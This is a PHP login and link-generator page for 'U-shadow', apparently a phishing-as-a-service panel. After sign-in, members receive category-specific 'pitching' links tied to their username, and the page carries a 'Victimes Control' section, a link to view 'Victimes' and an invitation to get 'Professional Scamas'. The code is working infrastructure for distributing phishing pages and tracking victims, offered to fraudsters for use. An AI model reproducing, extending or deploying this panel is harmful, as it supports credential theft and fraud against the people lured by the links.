<?php
session_start();
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    $users = json_decode(file_get_contents('users.json'), true);
    $authenticated = false;

    foreach ($users as $user) {
        if ($user['username'] === $username && password_verify($password, $user['password'])) {
            $_SESSION['user'] = $user;
            $authenticated = true;
            break;
        }
    }

    if ($authenticated) {
        header('Location: dashboard.php');
        exit;
    } else {
        $error = 'Invalid username or password';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>U-shadow | Smikta v2.3</title>
    <link rel="stylesheet" href="public/css/style.css">
</head>
<body>

<header>
    <div class="logo">U-SHADOW</div>
    <div style="clear: both;"></div>
</header>

<div style="text-align: center;">
    <a href="#" class="telegram-btn">Join Our Telegram</a>
</div>

<nav>
    <ul>
        <li><a href="index.php">Home</a></li>
        <li><a href="signup.php">Sign Up</a></li>
        <li><a href="#">Short Your Link</a></li>
        <li><a href="#">Facebook</a></li>
        <li><a href="#">Contact</a></li>
    </ul>
    <div style="float: right;">🌍</div>
</nav>

<div class="main-container">
    <div class="side-branding">
        <div class="logo-large">U-SHADOW</div>
        <p>Premium Pitching Solutions</p>
    </div>

    <div class="login-panel">
        <div class="panel-header">Login Panel</div>
        <div class="panel-body">
            <?php if ($error): ?>
                <p class="error"><?php echo htmlspecialchars($error); ?></p>
            <?php endif; ?>
            <?php if (isset($_SESSION['user'])): ?>
                <p>Logged in as: <?php echo htmlspecialchars($_SESSION['user']['username']); ?></p>
                <a href="dashboard.php"><button>Go to Dashboard</button></a>
                <a href="logout.php"><button>Logout</button></a>
            <?php else: ?>
                <form action="index.php" method="POST">
                    <input type="text" name="username" placeholder="Username" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Sign In</button>
                </form>
                <p style="font-size: 10px; text-align: center;"><a href="#">Forgot Password?</a></p>
            <?php endif; ?>
        </div>
        <div style="text-align: center; font-size: 30px; font-weight: bold; color: #ff0000; padding: 20px;">ADS</div>
    </div>

    <div class="victimes-control">
        <div class="panel-header">.: Victimes Control :.</div>
        <div class="panel-body" style="text-align: center;">
            <?php if (isset($_SESSION['user'])): ?>
                <h3>Your Pitching Links</h3>
                <div style="display: flex; flex-wrap: wrap; gap: 10px; justify-content: center;">
                    <?php
                    $categories = json_decode(file_get_contents('categories.json'), true);
                    foreach ($categories as $cat):
                        $generated_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]/" . strtolower($cat) . ".php?user=" . urlencode($_SESSION['user']['username']);
                    ?>
                        <div style="border: 1px solid #ccc; padding: 5px; background: #f9f9f9; width: 150px;">
                            <strong><?php echo htmlspecialchars($cat); ?></strong><br>
                            <input type="text" value="<?php echo htmlspecialchars($generated_link); ?>" style="width: 100%; font-size: 9px;" readonly onclick="this.select()">
                        </div>
                    <?php endforeach; ?>
                </div>
                <p><a href="dashboard.php">View Your Victimes</a></p>
            <?php else: ?>
                <p>Sorry You Must Be Member To See Your Victimes</p>
                <p>Sign Up for Get Your Professional Scamas</p>
                <p><a href="signup.php">Sign Up Here</a></p>
            <?php endif; ?>
        </div>
    </div>
</div>

<div class="footer">
    Copyright 2010-2025 | This Website Is Developed By K24KDX <br>
    U-shadow v2.3 ©
</div>

</body>
</html>
